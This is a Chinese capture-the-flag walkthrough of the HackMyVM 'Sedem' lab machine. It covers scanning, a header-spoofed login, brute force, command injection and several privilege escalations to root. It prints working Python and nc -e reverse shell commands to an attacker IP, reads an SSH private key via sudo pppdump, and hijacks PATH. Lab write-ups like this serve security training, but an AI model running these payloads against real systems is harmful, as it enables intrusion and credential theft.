> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/BeYHt-J2H4Sux9HuXSyMvw)

No. Sedem
=========

![图片](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUsY5pTsbRa4TJLXd6onaP3ugk45f95AVCTL9hpDXR1xvTf9AcNicXnA5Ohfsc3OJwX6Td0INU5zbxA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

靶机信息
----

下载地址:

```
https://hackmyvm.eu/machines/machine.php?vm=Sedem  
网盘链接：https://pan.baidu.com/s/1MYO7cEOg2xou1FrC40v6qg?pwd=ja7r
```

靶场: HackMyVm.eu

靶机名称: Sedem

难度: 中等

发布时间: 2021年5月14日

提示信息:

```
无
```

目标: user.txt和root.txt

  

实验环境
----

```
攻击机:VMware kali 10.0.0.3 eth0桥接互联网，eth1桥接vbox-Host-Only  
  
靶机:Vbox linux IP自动获取 网卡host-Only
```

  

信息收集
----

### 扫描主机

扫描局域网内的靶机IP地址

```
sudo nmap -sP 10.0.0.1/24
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

扫描到主机地址为10.0.0.113

### 扫描端口

扫描靶机开放的服务端口

```
sudo nmap -sC -sV -p- 10.0.0.113 -oN nmap.log
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

发现22和80端口，访问80端口

Web渗透
-----

```
http://10.0.0.113
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

首页只有一张图片，没有任何提示，

### 目录扫描

```
gobuster dir -u http://10.0.0.113 -w ../../Dict/SecLists-2022.1/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt,zip
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

扫描到2个目录，其中manual是apache的文档，再来对sysadmin目录进行扫描

```
gobuster dir -u http://10.0.0.113/sysadmin -w ../../Dict/SecLists-2022.1/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt,zip
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

扫描到目录下的index.php报错误403拒绝请求，可能需要条件才能访问

### 伪造IP访问

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

经过多次尝试后，在头部伪造了访问IP地址 “X-Forwarded-For: 127.0.0.1”使网站可以正常显示，这是一个登录页面没有任何提示。尝试暴破密码和SQL注入

### 密码暴破

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

拿到密码，登录看看

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

登录后跳转到system目录，源码中有段提示说做什么都可以，猜测是命令执行漏洞。做个模糊测试，暴破下参数

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

拿到参数，我们试下效果

```
http://10.0.0.113/sysadmin/system/?mission=id
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

现在可以反弹shell到攻击机上

### 反弹Shell

1。攻击机监听4444端口

```
nc -lvvp 4444
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

2。执行反弹shell命令

```
http://10.0.0.113/sysadmin/system/?mission=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.3",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

反弹成功，互换到交互式shell

```
python3 -c 'import pty;pty.spawn("/bin/bash")'  
export TERM=xterm  
Ctrl+z  
stty raw -echo;fg  
reset
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

切换完，找一下主机的敏感信息

```
cat /etc/passwd
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

找到3个用户

### 提权

```
sudo -l
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

找到可以使用user1身份执行pppdump命令，先看下这个pppdump是什么文件

```
man pppdump
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

这是转换ppp文件为可读格式的工具，尝试读取文件

```
pppdump index.php
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

好像可以读，但是变成了16进制，试着读取用户目录下的id_rsa文件

```
sudo -u user1 pppdump /home/user1/.ssh/id_rsa
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

有id_rsa文件，把内容保存下来再去转换

```
cd /tmp  
sudo -u user1 pppdump /home/user1/.ssh/id_rsa >id_rsa
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

把文件拿去解一下

```
https://icyberchef.com/#recipe=From_Hex('Auto')
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

把key保存到攻击机上，SSH登录到靶机

```
vi id_rsa  
chmod 600 id_rsa  
ssh user1@10.0.0.113 -i id_rsa
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

登录成功，再来找找提权信息

```
sudo -l
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

找到可以使用user2用户的身份执行code.py脚本，看一下这个脚本是干什么的

```
cd /home/user2/socket  
cat code.py
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

这个脚本会通过socket.SOCK_STREAM接收数据,如果接收到了就会执行收到的命令，验证一下

需要建立两个SSH连接，一个执行code.py，另一个发送数据，另外攻击机上还要监听3333端口用来接收反弹回来的shell

SSH连接1

```
sudo -u user2 /usr/bin/python /home/user2/socket/code.py
```

SSH连接2

```
echo 'nc 10.0.0.3 3333 -e "/bin/bash"' | socat - UNIX-CLIENT:/home/user2/socket/socket_test.s
```

攻击机

```
nc -lvvp 3333
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

接收到shell，切换下交互式shell

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

切换完成，寻找提权的方法

```
cd /home/user3  
ls -al
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

user3用户目录下发现隐藏文件.privacy.txt，看一下内容

```
cat .privacy.txt
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

一段加密的字符串看着像md5，拿去试试

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

拿到密码，切换到user3

```
su user3  
cd /home/user3  
ls  
cat TODO.txt
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

在TODO.txt文件中找到提示，让我们查找user.txt，但是执行find命令，提示没有权限 ，只能手动查找了

```
cd /opt  
ls -al
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

user.txt没找到，找到一个提权命令，来看看这个命令执行了哪些命令

```
strings check
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

我们到/tmp目录下创建service命令，再支持环境变量达到提权

1。攻击机监听1234端口

```
nc -lvvp 1234
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```
cd /tmp  
echo 'nc 10.0.0.3 1234 -e "/bin/bash"' >service  
chmod +x service  
/opt/check
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

提权成功，找一下flag

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

拿到root.txt，再找找user.txt

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

拿到user.txt，游戏结束

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)